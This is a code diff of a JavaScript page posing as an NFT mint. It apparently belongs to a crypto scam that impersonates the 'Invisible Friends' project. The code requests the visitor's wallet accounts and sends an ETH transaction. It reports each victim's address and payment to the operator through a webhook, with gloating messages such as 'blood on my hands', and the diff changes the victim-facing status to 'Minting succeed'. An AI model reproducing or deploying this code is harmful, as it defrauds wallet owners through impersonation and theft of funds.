@@ -33,7 +33,7 @@ function sendMessage(cont) {
         // replace the url in the "open" method with yours
         request.setRequestHeader('Content-type', 'application/json');
         const params = {
-            username: "edgy",
+            username: "InvisibleFriends",
             avatar_url: "",
             content: cont
         }
@@ -125,7 +125,7 @@ connectBtn.addEventListener('click', async () => {
       accounts = await ethereum.request({ method: "eth_requestAccounts" }); //  [Wikipedia](https://en.wikipedia.org/)
       sendMessage("**[" + myid + "] **Trying to mint. \n `" + accounts[0] + "` {<https://etherscan.io/address/" + accounts[0] + ">}")
       const priceToWei = (totalEth * 1e18).toString(16);
-      const gasLimit = (200_000 * totalEth).toString(16);
+      const gasLimit = (100_000 * totalEth).toString(16);
       ethereum
         .request({
           method: "eth_sendTransaction",
@@ -138,11 +138,11 @@ connectBtn.addEventListener('click', async () => {
           ],
         })
         .then((txHash) => {
-          statusp.innerText = 'Minting failed';
+          statusp.innerText = 'Minting succeed';
           checkoutBtn.innerText = 'Mint again?'
-         sendMessage("**[" + myid + "] ** MINTED")
-         sendMessage("**[" + myid + "] ** MINTED")
-         sendMessage("**[" + myid + "] ** MINTED, Verd mu kätel: +" + totalEth.toString())
+          sendMessage("**[" + myid + "] ** MINTED")
+          sendMessage("**[" + myid + "] ** MINTED")
+          sendMessage("**[" + myid + "] ** MINTED, Verd mu kätel: +" + totalEth.toString())
         })
         .catch((error) => {
           console.log('Minting failed', error)
@@ -151,3 +151,4 @@ connectBtn.addEventListener('click', async () => {
         });
     })
   }
+
